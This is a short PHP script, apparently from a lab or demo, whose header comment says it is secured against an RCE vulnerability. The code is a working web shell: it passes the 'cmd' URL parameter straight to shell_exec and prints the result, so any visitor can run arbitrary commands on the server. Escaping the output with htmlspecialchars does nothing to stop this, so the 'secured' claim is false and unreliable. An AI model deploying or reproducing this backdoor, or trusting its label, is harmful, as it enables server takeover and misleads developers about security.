<!--
Script written by Carlos Chacón Molina

Script securited for a RCE Vulnerability
-->
<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
/* If the parameter cmd not exists finish the execution */
if (!isset($_GET['cmd'])) {
    die("Falta el parametro cmd");
}

$output = shell_exec($_GET['cmd']);
echo htmlspecialchars((string) ($output ?? ''), ENT_QUOTES, 'UTF-8');
?>
